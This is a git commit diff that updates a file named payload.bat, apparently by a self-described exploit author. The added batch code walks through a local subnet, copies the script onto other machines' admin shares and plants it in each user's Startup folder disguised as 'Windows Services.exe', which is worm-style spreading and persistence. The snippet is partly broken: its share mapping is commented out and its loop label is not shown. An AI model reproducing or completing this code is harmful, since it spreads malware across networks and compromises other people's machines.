9370ee965f8a95b623d22e1ef520210bf9b64e3f
H1i_sillyxploiter <129692077+unfunnylaugh@users.noreply.github.com>
2024-02-26 18:54:27 -0300

    Update payload.bat

--- payload.bat
+++ payload.bat
@@ -3,5 +3,12 @@ mode con: cols=20 lines=1
 cd %systemroot%
 echo Starting System... 
 
+
+REM net use Z: \\192.168.1.%i%\C$
+if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
+mountvol Z: /d)
+if %i% == 256 (goto Infect) else (set /a i=i+1)
+
+
 timeout /t 0.80 /nobreak > nul
 exit
